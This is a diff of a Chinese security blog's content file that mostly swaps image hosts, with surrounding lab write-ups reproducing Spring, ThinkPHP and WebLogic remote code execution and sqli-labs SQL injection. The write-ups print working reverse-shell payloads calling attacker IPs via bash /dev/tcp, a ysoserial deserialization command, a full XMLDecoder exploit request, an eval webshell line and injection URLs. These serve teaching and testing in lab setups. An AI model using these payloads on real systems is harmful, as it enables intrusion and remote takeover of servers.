 <p>等待环境启动后，访问<code>http://your-ip:8080</code>，将看到一个酒店预订的页面，这是<code>spring-webflow</code>官方给的简单示例。</p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先访问<code>http://your-ip:8080/login</code>，用页面左边给出的任意一个账号/密码登录系统：</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092905.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092905.png" alt="image"></p>
 <p>然后访问id为1的酒店<code>http://your-ip:8080/hotels/1</code>，点击预订按钮“Book Hotel”，填写相关信息后点击“Proceed”（从这一步，其实WebFlow就正式开始了）：</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092906.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092906.png" alt="image"></p>
 <p>再点击确认“Confirm”，此时抓包：</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092907.png" alt="image"></p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092908.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092907.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092908.png" alt="image"></p>
 <p>我们向其中添加一个字段（也就是反弹shell的POC）：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;21 0&gt;&amp;1&quot;)).start()&#x3D;vulhub</span><br></pre></td></tr></table></figure>
 
 <p>把反弹shell的POC进行URL编码</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092909.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092909.png" alt="image"></p>
 <p>重放数据包</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092910.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092910.png" alt="image"></p>
 <p>成功反弹shell</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092911.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092911.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -1246,14 +1246,14 @@
 <p>Spring Security OAuth 2.1到2.1.1</p>
 <p>Spring Security OAuth 2.0到2.0.14</p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://your-ip:8080/oauth/authorize?response_type=$&#123;233*233&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code>。首先需要填写用户名和密码，我们这里填入<code>admin:admin</code>即可。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092901.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092901.png" alt="image"></p>
 <p>对反弹shell的POC进行base64编码<br><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092902.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092902.png" alt="image"></p>
 <p>使用<code>poc.py</code>生成反弹shell的POC：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">message &#x3D; input(&#39;Enter message to encode:&#39;)</span><br><span class="line"></span><br><span class="line">poc &#x3D; &#39;$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#39; % ord(message[0])</span><br><span class="line"></span><br><span class="line">for ch in message[1:]:</span><br><span class="line">   poc +&#x3D; &#39;.concat(T(java.lang.Character).toString(%s))&#39; % ord(ch) </span><br><span class="line"></span><br><span class="line">poc +&#x3D; &#39;)&#125;&#39;</span><br><span class="line"></span><br><span class="line">print(poc)</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092903.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092903.png" alt="image"></p>
 <p>监听反弹shell，并访问URL<code>http://your-ip:8080/oauth/authorize?response_type=上面的那一长串POC&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code></p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092904.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092904.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -1270,17 +1270,17 @@
 <p>导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。</p>
 <p>ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。</p>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用vulfocous启动漏洞环境</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092801.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092801.png" alt="image"></p>
 <p>打开就是ThinkPHP的默认页面</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092802.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092802.png" alt="image"></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问 <strong><a href="http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D">http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D</a></strong> 即可执行<strong>phpinfo()</strong>:</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092803.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092803.png" alt="image"></p>
 <p>然后接入一句话</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;xxx&#x2F;$&#123;$&#123;@eval($_POST[1])&#125;&#125;</span><br></pre></td></tr></table></figure>
 <p>使用蚁剑连接</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092804.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092804.png" alt="image"></p>
 <p>拿到flag</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092805.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092805.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -1296,12 +1296,12 @@
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>上海顶想信息科技有限公司 ThinkPHP 5.*，&lt;5.1.31</p>
 <p>上海顶想信息科技有限公司 ThinkPHP &lt;=5.0.23</p>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用 vulfocus 启动漏洞环境</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092806.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092806.png" alt="image"></p>
 <p>访问页面如下：</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092807.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092807.png" alt="image"></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;ls%20&#x2F;tmp</span><br></pre></td></tr></table></figure>
 <p>直接访问拿到flag</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092808.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092808.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -1317,26 +1317,26 @@
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Weblogic 10.3.6.0<br>Weblogic 12.1.3.0<br>Weblogic 12.2.1.2<br>Weblogic 12.2.1.3</p>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h3><p>使用vulhub搭建漏洞环境</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd vulhub&#x2F;weblogic&#x2F;CVE-2018-2628</span><br><span class="line"></span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092711.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092711.png" alt="image"></p>
 <p>访问 <a href="http://47.101.62.20:7001/console">http://47.101.62.20:7001/console</a> 初始化整个环境</p>
 <h3 id="攻击机环境"><a href="#攻击机环境" class="headerlink" title="攻击机环境"></a>攻击机环境</h3><p>下载 <strong>ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</strong>利用包</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;brianwrf&#x2F;ysoserial&#x2F;releases&#x2F;download&#x2F;0.0.6-pri-beta&#x2F;ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092712.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092712.png" alt="image"></p>
 <p>下载漏洞利用EXP，我这里已经下载好了</p>
 <p><a href="https://www.exploit-db.com/exploits/44553">https://www.exploit-db.com/exploits/44553</a></p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>监听端口19110</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092713.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092713.png" alt="image"></p>
 <p>使用<strong>ysoserial</strong>启动一个<strong>JMRP Server</strong></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 19111 CommonsCollections1 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuNjIuMjAvMTkxMTAgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>JMRP Server在19111端口上监听请求，向目标服务器发送序列化的bash反弹shell命令，反弹监听的端口为19110</p>
 </blockquote>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092714.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092714.png" alt="image"></p>
 <p>使用CVE-2018-2628的EXP向目标WebLogic服务器发送攻击载荷</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python CVE-2018-2628.py 47.101.62.20 7001 ..&#x2F;ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 47.101.62.20 19111 JRMPClient</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092715.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092715.png" alt="image"></p>
 <p>成功反弹shell</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092716.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092716.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -1353,16 +1353,16 @@
 <p>该漏洞的影响模块为web服务测试页，在默认情况下不启用。 受影响的页面为 <strong>/ws_utc/config.do</strong> 和 <strong>/ws_utc/begin.do</strong></p>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用vulhub搭建漏洞环境</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd vulhub&#x2F;weblogic&#x2F;CVE-2018-2894</span><br><span class="line"></span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p>直接访问存在漏洞的页面<strong><a href="http://47.101.62.20:7001/ws_utc/config.do">http://47.101.62.20:7001/ws_utc/config.do</a></strong><br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092706.png" alt="image"></p>
+<p>直接访问存在漏洞的页面<strong><a href="http://47.101.62.20:7001/ws_utc/config.do">http://47.101.62.20:7001/ws_utc/config.do</a></strong><br><img src="https://qiniu.hzktester.top/tp2020092706.png" alt="image"></p>
 <p>将目录设置为<strong>ws_utc</strong>应用的静态文件css目录，访问这个目录是无需权限的,可以直接进行访问上传的文件</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;u01&#x2F;oracle&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;com.oracle.webservices.wls.ws-testclient-app-wls&#x2F;4mcj4y&#x2F;war&#x2F;css</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092707.png" alt="image"></p>
-<p>打开安全页面，然后上传<strong>webshell</strong>，并且获取时间戳<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092708.png" alt="image"><br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092709.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092707.png" alt="image"></p>
+<p>打开安全页面，然后上传<strong>webshell</strong>，并且获取时间戳<br><img src="https://qiniu.hzktester.top/tp2020092708.png" alt="image"><br><img src="https://qiniu.hzktester.top/tp2020092709.png" alt="image"></p>
 <p>访问上传的jsp马</p>
 <blockquote>
 <p>具体格式为 <a href="http://your-ip:7001/ws_utc/css/config/keystore/[%E6%97%B6%E9%97%B4%E6%88%B3]_[%E6%96%87%E4%BB%B6%E5%90%8D]">http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</a></p>
 </blockquote>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092710.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092710.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -1377,18 +1377,18 @@
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>CVE-2017-10271漏洞产生的原因大致是Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。攻击者发送精心构造的xml数据甚至能通过反弹shell拿到权限</p>
 <h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>10.3.6.0.0，12.1.3.0.0，12.2.1.1.0，12.2.1.2.0</p>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用vulfoces搭建漏洞环境</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092701.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092701.png" alt="image"></p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol>
 <li>访问地址<strong><a href="http://47.101.62.20:27036/">http://47.101.62.20:27036/</a></strong> 页面长这样</li>
 </ol>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092702.png" alt="image"><br>2. 访问<strong><a href="http://47.101.62.20:27036/wls-wsat/CoordinatorPortType11">http://47.101.62.20:27036/wls-wsat/CoordinatorPortType11</a></strong>，存在下图则有可能存在漏洞</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092703.png" alt="image"><br>3. 构造POC</p>
+<p><img src="https://qiniu.hzktester.top/tp2020092702.png" alt="image"><br>2. 访问<strong><a href="http://47.101.62.20:27036/wls-wsat/CoordinatorPortType11">http://47.101.62.20:27036/wls-wsat/CoordinatorPortType11</a></strong>，存在下图则有可能存在漏洞</p>
+<p><img src="https://qiniu.hzktester.top/tp2020092703.png" alt="image"><br>3. 构造POC</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;wls-wsat&#x2F;CoordinatorPortType11 HTTP&#x2F;1.1</span><br><span class="line">Host: 47.101.62.20:27036</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko&#x2F;20100101 Firefox&#x2F;48.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">Content-Length: 756</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">&lt;java version&#x3D;&quot;1.4.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.101.62.20&#x2F;1234 0&gt;&amp;1&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;array&gt;</span><br><span class="line">&lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;java&gt;</span><br><span class="line">&lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092704.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092704.png" alt="image"></p>
 <ol start="4">
 <li>成功反弹shell，执行命令得到flag</li>
 </ol>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092705.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092705.png" alt="image"></p>
 <h2 id="poc验证脚本"><a href="#poc验证脚本" class="headerlink" title="poc验证脚本"></a>poc验证脚本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># coding:utf-8</span><br><span class="line"> </span><br><span class="line">import requests</span><br><span class="line">from sys import argv</span><br><span class="line"> </span><br><span class="line">headers &#x3D; &#123;</span><br><span class="line">	&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko&#x2F;20100101 Firefox&#x2F;48.0&#39;,</span><br><span class="line">	&#39;Accept&#39;: &#39;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8&#39;,</span><br><span class="line">	&#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;,</span><br><span class="line">	&#39;Content-Type&#39;: &#39;text&#x2F;xml&#39;</span><br><span class="line">    &#125;</span><br><span class="line">def Webogic_XMLDecoder_poc(url):</span><br><span class="line">	#url&#x3D;&quot;http:&#x2F;&#x2F;47.101.62.20:27036&quot;</span><br><span class="line">	posturl&#x3D;url+&#39;&#x2F;wls-wsat&#x2F;CoordinatorPortType&#39;</span><br><span class="line">	data &#x3D; &#39;&#39;&#39;</span><br><span class="line">	&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;</span><br><span class="line">		&lt;soapenv:Header&gt;</span><br><span class="line">			&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">				&lt;java version&#x3D;&quot;1.6.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">					&lt;object class&#x3D;&quot;java.io.PrintWriter&quot;&gt; </span><br><span class="line">						&lt;string&gt;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;wls-wsat&#x2F;54p17w&#x2F;war&#x2F;test.txt&lt;&#x2F;string&gt;&lt;void method&#x3D;&quot;println&quot;&gt;</span><br><span class="line">						&lt;string&gt;xmldecoder_vul_test&lt;&#x2F;string&gt;&lt;&#x2F;void&gt;&lt;void method&#x3D;&quot;close&quot;&#x2F;&gt;</span><br><span class="line">					&lt;&#x2F;object&gt;</span><br><span class="line">				&lt;&#x2F;java&gt;</span><br><span class="line">			&lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">		&lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">		&lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">	&lt;&#x2F;soapenv:Envelope&gt;</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">	</span><br><span class="line">	print url</span><br><span class="line">	try:</span><br><span class="line">		r&#x3D;requests.post(posturl,data&#x3D;data,headers&#x3D;headers,timeout&#x3D;5)</span><br><span class="line">		geturl&#x3D;url+&quot;&#x2F;wls-wsat&#x2F;test.txt&quot;</span><br><span class="line">		#print geturl</span><br><span class="line">		check_result &#x3D; requests.get(geturl,headers&#x3D;headers,timeout&#x3D;5)</span><br><span class="line">		if &#39;xmldecoder_vul_test&#39; in check_result.text:</span><br><span class="line">			print u&quot;存在WebLogic WLS远程执行漏洞(CVE-2017-10271)&quot;</span><br><span class="line">	except:</span><br><span class="line">		pass</span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">	if len(argv) &#x3D;&#x3D; 1:</span><br><span class="line">		print &quot;Please input python Webogic_XMLDecoder_poc.py http:&#x2F;&#x2F;xxxx:7001&quot;</span><br><span class="line">		exit(0)</span><br><span class="line">	else:</span><br><span class="line">		url &#x3D; argv[1]</span><br><span class="line">	Webogic_XMLDecoder_poc(url)</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -1585,7 +1585,7 @@
 <p>这一关的策略和less5是一样的，只需要将’换为”即可</p>
 <p>演示其中一个payload。使用left()函数布尔注入</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-6&#x2F;?id&#x3D;1%22and%20left(version(),1)&#x3D;5--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092409.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092409.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>sqli-labs靶场</category>
@@ -1603,13 +1603,13 @@
 <p>payload请求：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20If(ascii(substr(database(),1,1))&#x3D;116,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
 <p>当dadabase()的ASCII值不是116就延时5s然后页面返回空。此处改为115是正确返回</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092407.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092407.png" alt="image"></p>
 <h3 id="利用-BENCHMARK-进行延时注入"><a href="#利用-BENCHMARK-进行延时注入" class="headerlink" title="利用 BENCHMARK()进行延时注入"></a>利用 BENCHMARK()进行延时注入</h3><p>sql语句：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UNION SELECT (IF(SUBSTRING(current,1,1)&#x3D;CHAR(115),BENCHMARK(50000000,ENCODE(&#39;MSG&#39;,&#39;by 5 seconds&#39;)),null)),2,3 FROM (select database() as current) as tb1</span><br></pre></td></tr></table></figure>
 <p>payload请求：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27UNION%20SELECT%20(IF(SUBSTRING(current,1,1)&#x3D;CHAR(115),BENCHMARK(50000000,ENCODE(%27MSG%27,%27by%205%20seconds%27)),null)),2,3%20FROM%20(select%20database()%20as%20current)%20as%20tb1--+</span><br></pre></td></tr></table></figure>
 <p>这里当返回结果正确的时候会延时5s返回，错误时不延时</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092408.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092408.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>sqli-labs靶场</category>
@@ -1626,32 +1626,32 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a</span><br></pre></td></tr></table></figure>
 <p>请求payload：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20union%20Select%201,count(*),concat(0x3a,0x3a,(select%20user()),0x3a,0x3a,floor(rand(0)*2))a%20from%20information_schema.columns%20group%20by%20a--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092401.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092401.png" alt="image"></p>
 <h3 id="利用double数值类型超出范围进行报错注入"><a href="#利用double数值类型超出范围进行报错注入" class="headerlink" title="利用double数值类型超出范围进行报错注入"></a>利用double数值类型超出范围进行报错注入</h3><p>sql语句：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select (exp(~(select * FROM(SELECT USER())a))),2, 3</span><br></pre></td></tr></table></figure>
 <p>请求payload：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20union%20select%20(exp(~(select%20*%20FROM(SELECT%20USER())a))),2,%203--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092402.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092402.png" alt="image"></p>
 <h3 id="利用-bigint-溢出进行报错注入"><a href="#利用-bigint-溢出进行报错注入" class="headerlink" title="利用 bigint 溢出进行报错注入"></a>利用 bigint 溢出进行报错注入</h3><p>sql语句：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select (!(select * from (select user())x) - ~0),2,3</span><br></pre></td></tr></table></figure>
 <p>请求payload：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20union%20select%20(!(select%20*%20from%20(select%20user())x)%20-%20~0),2,3--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020092403.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020092403.png" alt="image"></p>
 <h3 id="xpath函数报错注入"><a href="#xpath函数报错注入" class="headerlink" title="xpath函数报错注入"></a>xpath函数报错注入</h3><h4 id="使用extractvalue-函数"><a href="#使用extractvalue-函数" class="headerlink" title="使用extractvalue()函数"></a>使用extractvalue()函数</h4><p>sql语句：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select @@version),0x7e))</span><br></pre></td></tr></table></figure>
 <p>请求payload：</p>
